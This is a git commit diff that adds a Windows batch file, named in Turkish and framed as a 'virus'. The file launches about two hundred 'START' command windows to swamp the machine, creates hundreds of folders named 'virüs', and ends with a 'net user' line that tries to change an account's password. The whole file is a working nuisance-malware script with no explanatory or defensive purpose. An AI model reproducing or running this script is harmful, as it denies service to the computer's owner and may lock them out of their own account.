ed515193d85e69a4445bf53c4c7f2e528942ca35
karpuzman123 <a12943089@gmail.com>
2024-09-20 21:18:59 +0300

    Add files via upload

---
+++ geri dönücem/geri döneeğm.bat
@@ -0,0 +1,682 @@
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+START
+
+md virüs 1
+md virüs 2
+md virüs 3
+md virüs 4
+md virüs 5
+md virüs 0
+md virüs 1
+md virüs 2
+md virüs 3
+md virüs 4
+md virüs 5
+md virüs 6
+md virüs 7
+md virüs 8
+md virüs 9
+md virüs 10
+md virüs 11
+md virüs 12
+md virüs 13
+md virüs 14
+md virüs 15
+md virüs 16
+md virüs 17
+md virüs 18
+md virüs 19
+md virüs 20
+md virüs 21
+md virüs 22
+md virüs 23
+md virüs 24
+md virüs 25
+md virüs 26
+md virüs 27
+md virüs 28
+md virüs 29
+md virüs 30
+md virüs 31
+md virüs 32
+md virüs 33
+md virüs 34
+md virüs 35
+md virüs 36
+md virüs 37
+md virüs 38
+md virüs 39
+md virüs 40
+md virüs 41
+md virüs 42
+md virüs 43
+md virüs 44
+md virüs 45
+md virüs 46
+md virüs 47
+md virüs 48
+md virüs 49
+md virüs 50
+md virüs 51
+md virüs 52
+md virüs 53
+md virüs 54
+md virüs 55
+md virüs 56
+md virüs 57
+md virüs 58
+md virüs 59
+md virüs 60
+md virüs 61
+md virüs 62
+md virüs 63
+md virüs 64
+md virüs 65
+md virüs 66
+md virüs 67
+md virüs 68
+md virüs 69
+md virüs 70
+md virüs 71
+md virüs 72
+md virüs 73
+md virüs 74
+md virüs 75
+md virüs 76
+md virüs 77
+md virüs 78
+md virüs 79
+md virüs 80
+md virüs 81
+md virüs 82
+md virüs 83
+md virüs 84
+md virüs 85
+md virüs 86
+md virüs 87
+md virüs 88
+md virüs 89
+md virüs 90
+md virüs 91
+md virüs 92
+md virüs 93
+md virüs 94
+md virüs 95
+md virüs 96
+md virüs 97
+md virüs 98
+md virüs 99
+md virüs 100
+md virüs 101
+md virüs 102
+md virüs 103
+md virüs 104
+md virüs 105
+md virüs 106
+md virüs 107
+md virüs 108
+md virüs 109
+md virüs 110
+md virüs 111
+md virüs 112
+md virüs 113
+md virüs 114
+md virüs 115
+md virüs 116
+md virüs 117
+md virüs 118
+md virüs 119
+md virüs 120
+md virüs 121
+md virüs 122
+md virüs 123
+md virüs 124
+md virüs 125
+md virüs 126
+md virüs 127
+md virüs 128
+md virüs 129
+md virüs 130
+md virüs 131
+md virüs 132
+md virüs 133
+md virüs 134
+md virüs 135
+md virüs 136
+md virüs 137
+md virüs 138
+md virüs 139
+md virüs 140
+md virüs 141
+md virüs 142
+md virüs 143
+md virüs 144
+md virüs 145
+md virüs 146
+md virüs 147
+md virüs 148
+md virüs 149
+md virüs 150
+md virüs 151
+md virüs 152
+md virüs 153
+md virüs 154
+md virüs 155
+md virüs 156
+md virüs 157
+md virüs 158
+md virüs 159
+md virüs 160
+md virüs 161
+md virüs 162
+md virüs 163
+md virüs 164
+md virüs 165
+md virüs 166
+md virüs 167
+md virüs 168
+md virüs 169
+md virüs 170
+md virüs 171
+md virüs 172
+md virüs 173
+md virüs 174
+md virüs 175
+md virüs 176
+md virüs 177
+md virüs 178
+md virüs 179
+md virüs 180
+md virüs 181
+md virüs 182
+md virüs 183
+md virüs 184
+md virüs 185
+md virüs 186
+md virüs 187
+md virüs 188
+md virüs 189
+md virüs 190
+md virüs 191
+md virüs 192
+md virüs 193
+md virüs 194
+md virüs 195
+md virüs 196
+md virüs 197
+md virüs 198
+md virüs 199
+md virüs 200
+md virüs 201
+md virüs 202
+md virüs 203
+md virüs 204
+md virüs 205
+md virüs 206
+md virüs 207
+md virüs 208
+md virüs 209
+md virüs 210
+md virüs 211
+md virüs 212
+md virüs 213
+md virüs 214
+md virüs 215
+md virüs 216
+md virüs 217
+md virüs 218
+md virüs 219
+md virüs 220
+md virüs 221
+md virüs 222
+md virüs 223
+md virüs 224
+md virüs 225
+md virüs 226
+md virüs 227
+md virüs 228
+md virüs 229
+md virüs 230
+md virüs 231
+md virüs 232
+md virüs 233
+md virüs 234
+md virüs 235
+md virüs 236
+md virüs 237
+md virüs 238
+md virüs 239
+md virüs 240
+md virüs 241
+md virüs 242
+md virüs 243
+md virüs 244
+md virüs 245
+md virüs 246
+md virüs 247
+md virüs 248
+md virüs 249
+md virüs 250
+md virüs 251
+md virüs 252
+md virüs 253
+md virüs 254
+md virüs 255
+md virüs 256
+md virüs 257
+md virüs 258
+md virüs 259
+md virüs 260
+md virüs 261
+md virüs 262
+md virüs 263
+md virüs 264
+md virüs 265
+md virüs 266
+md virüs 267
+md virüs 268
+md virüs 269
+md virüs 270
+md virüs 271
+md virüs 272
+md virüs 273
+md virüs 274
+md virüs 275
+md virüs 276
+md virüs 277
+md virüs 278
+md virüs 279
+md virüs 280
+md virüs 281
+md virüs 282
+md virüs 283
+md virüs 284
+md virüs 285
+md virüs 286
+md virüs 287
+md virüs 288
+md virüs 289
+md virüs 290
+md virüs 291
+md virüs 292
+md virüs 293
+md virüs 294
+md virüs 295
+md virüs 296
+md virüs 297
+md virüs 298
+md virüs 299
+md virüs 300
+md virüs 301
+md virüs 302
+md virüs 303
+md virüs 304
+md virüs 305
+md virüs 306
+md virüs 307
+md virüs 308
+md virüs 309
+md virüs 310
+md virüs 311
+md virüs 312
+md virüs 313
+md virüs 314
+md virüs 315
+md virüs 316
+md virüs 317
+md virüs 318
+md virüs 319
+md virüs 320
+md virüs 321
+md virüs 322
+md virüs 323
+md virüs 324
+md virüs 325
+md virüs 326
+md virüs 327
+md virüs 328
+md virüs 329
+md virüs 330
+md virüs 331
+md virüs 332
+md virüs 333
+md virüs 334
+md virüs 335
+md virüs 336
+md virüs 337
+md virüs 338
+md virüs 339
+md virüs 340
+md virüs 341
+md virüs 342
+md virüs 343
+md virüs 344
+md virüs 345
+md virüs 346
+md virüs 347
+md virüs 348
+md virüs 349
+md virüs 350
+md virüs 351
+md virüs 352
+md virüs 353
+md virüs 354
+md virüs 355
+md virüs 356
+md virüs 357
+md virüs 358
+md virüs 359
+md virüs 360
+md virüs 361
+md virüs 362
+md virüs 363
+md virüs 364
+md virüs 365
+md virüs 366
+md virüs 367
+md virüs 368
+md virüs 369
+md virüs 370
+md virüs 371
+md virüs 372
+md virüs 373
+md virüs 374
+md virüs 375
+md virüs 376
+md virüs 377
+md virüs 378
+md virüs 379
+md virüs 380
+md virüs 381
+md virüs 382
+md virüs 383
+md virüs 384
+md virüs 385
+md virüs 386
+md virüs 387
+md virüs 388
+md virüs 389
+md virüs 390
+md virüs 391
+md virüs 392
+md virüs 393
+md virüs 394
+md virüs 395
+md virüs 396
+md virüs 397
+md virüs 398
+md virüs 399
+md virüs 400
+md virüs 401
+md virüs 402
+md virüs 403
+md virüs 404
+md virüs 405
+md virüs 406
+md virüs 407
+md virüs 408
+md virüs 409
+md virüs 410
+md virüs 411
+md virüs 412
+md virüs 413
+md virüs 414
+md virüs 415
+md virüs 416
+md virüs 417
+md virüs 418
+md virüs 419
+md virüs 420
+md virüs 421
+md virüs 422
+md virüs 423
+md virüs 424
+md virüs 425
+md virüs 426
+md virüs 427
+md virüs 428
+md virüs 429
+md virüs 430
+md virüs 431
+md virüs 432
+md virüs 433
+md virüs 434
+md virüs 435
+md virüs 436
+md virüs 437
+md virüs 438
+md virüs 439
+md virüs 440
+md virüs 441
+md virüs 442
+md virüs 443
+md virüs 444
+md virüs 445
+md virüs 446
+md virüs 447
+md virüs 448
+md virüs 449
+md virüs 450
+md virüs 451
+md virüs 452
+md virüs 453
+md virüs 454
+md virüs 455
+md virüs 456
+md virüs 457
+md virüs 458
+md virüs 459
+md virüs 460
+md virüs 461
+md virüs 462
+md virüs 463
+
+net user %NAME% ama ben geri dönicem...
